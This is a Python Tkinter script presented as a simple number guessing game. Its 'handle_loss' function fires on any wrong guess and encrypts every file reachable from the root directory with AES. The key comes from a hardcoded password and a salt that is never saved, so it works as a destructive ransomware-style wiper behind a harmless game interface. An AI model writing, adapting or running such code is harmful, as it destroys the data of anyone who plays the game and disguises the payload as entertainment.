#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: April 19th 2024
# Description of Script
# This script is a simple number guessing game implemented in Python using the Tkinter library 
# for the graphical user interface. The game generates a random number between 1 and 10 
# and prompts the user to guess the number. If the user's guess is correct, the game prints 
# a congratulatory message. If the guess is incorrect, the game prints a message indicating 
# that the user has lost and calls a function to encrypt the root directories and all its 
# subdirectories and files using the cryptography library. The game can be started by clicking
# a "Start Game" button. The game also includes error handling to ensure that the user's input
# is valid before trying to convert it to an integer.
#################################################################################################
import tkinter as tk
import random
import os
import platform
import subprocess
import base64
import getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import shutil
import requests
from PIL import Image, ImageTk
from io import BytesIO

# Generate a random number between 1 and 10
number = random.randint(1, 10)

# Create the main window
window = tk.Tk()
window.title("Extremely Silly Game 2")
window.configure(bg="#40E0D0")

# Load and display the image at the top
image_link = "https://m.media-amazon.com/images/M/MV5BMzZmMjU0YzAtMjA1Yi00NDFjLTg0OWYtODU1Y2FlYjBlNTI0XkEyXkFqcGdeQXVyNjgyODE4NTE@._V1_.jpg"  # Replace with your image link
response = requests.get(image_link)
image_data = response.content
image = Image.open(BytesIO(image_data))
photo = ImageTk.PhotoImage(image)
image_label = tk.Label(window, image=photo)
image_label.image = photo  # Keep a reference to the image to prevent garbage collection
image_label.pack()

# Create a text widget to display the game's text
text_box = tk.Text(window, height=10, width=50)
text_box.pack()


# Create a function to handle the game logic
def play_game():
    # Prompt the user to play the game
    text_box.insert(tk.END, "Would you like to play the Extremely Silly Game 2? (yes/no)\n")

    def process_play():
        play = entry.get().lower()
        if play == "yes" or play == "y":
            text_box.insert(tk.END, "Welcome to the Extremely Silly Game 2!\n")
            # Prompt the user to guess a number between 1 and 1text_box.insert(tk.END, "Please guess a number between 1 and 10: ")
            guess = entry2.get()
            if guess:
                try:
                    guess = int(guess)
                    if guess == number:
                        # Print a congratulatory message if the guess is correct
                        text_box.insert(tk.END, "Congratulations on Winning the Extremely Silly Game 2!\n")
                    else:
                        # Print a message if the guess is incorrect
                        text_box.insert(tk.END, "Oh no.....\nYou have lost the Extremely Silly Game 2... Goodbye!\n")
                        # Call the function to handle the actions when the user loses the game
                        handle_loss()
                except ValueError:
                    text_box.insert(tk.END, "Invalid input. Please enter a number between 1 and 10.\n")
            else:
                text_box.insert(tk.END, "Please enter a number between 1 and 10.\n")
        else:
            # Print a message if the user doesn't want to play
            text_box.insert(tk.END, "Too bad...\nWelcome to the Extremely Silly Game 2!\n")
            # Prompt the user to guess a number between 1 and 10
            text_box.insert(tk.END, "Please guess a number between 1 and 10: ")
            guess = entry2.get()
            if guess:
                try:
                    guess = int(guess)
                    if guess == number:
                        # Print a congratulatory message if the guess is correct
                        text_box.insert(tk.END, "Congratulations on Winning the Extremely Silly Game 2!\n")
                    else:
                        # Print a message if the guess is incorrect
                        text_box.insert(tk.END, "Oh no.....\nYou have lost the Extremely Silly Game 2... Goodbye!\n")
                        # Call the function to handle the actions when the user loses the game
                        handle_loss()
                except ValueError:
                    text_box.insert(tk.END, "Invalid input. Please enter a number between 1 and 10.\n")
            else:
                text_box.insert(tk.END, "Please enter a number between 1 and 10.\n")

    entry = tk.Entry(window)
    entry.pack()
    entry2 = tk.Entry(window)
    entry2.pack()
    submit_button = tk.Button(window, text="Submit", command=process_play)
    submit_button.pack()


# Function to handle actions when the user loses the game
def handle_loss():
    # Generate a key for encryption
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
    password = "2pI34n%FrOq*0189HqPzR7&T@z"
    key = kdf.derive(password.encode())

    # Encrypt the root directories and all its subdirectories and files
    def encrypt_file(file_path):
        try:
            with open(file_path, "rb") as file:
                file_content = file.read()
        except OSError as e:
            print(f"Error reading file {file_path}: {e}")
            return
        nonce = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CTR(nonce=nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_content = encryptor.update(file_content) + encryptor.finalize()
        try:
            with open(file_path, "wb") as file:
                file.write(nonce + encrypted_content)
        except OSError as e:
            print(f"Error writing to file {file_path}: {e}")

    for root, dirs, files in os.walk("/", topdown=True):
        for name in files:
            encrypt_file(os.path.join(root, name))


# Create a button to start the game
start_button = tk.Button(window, text="Start Game", command=play_game)
start_button.pack()

# Run the main loop of the window
window.mainloop()

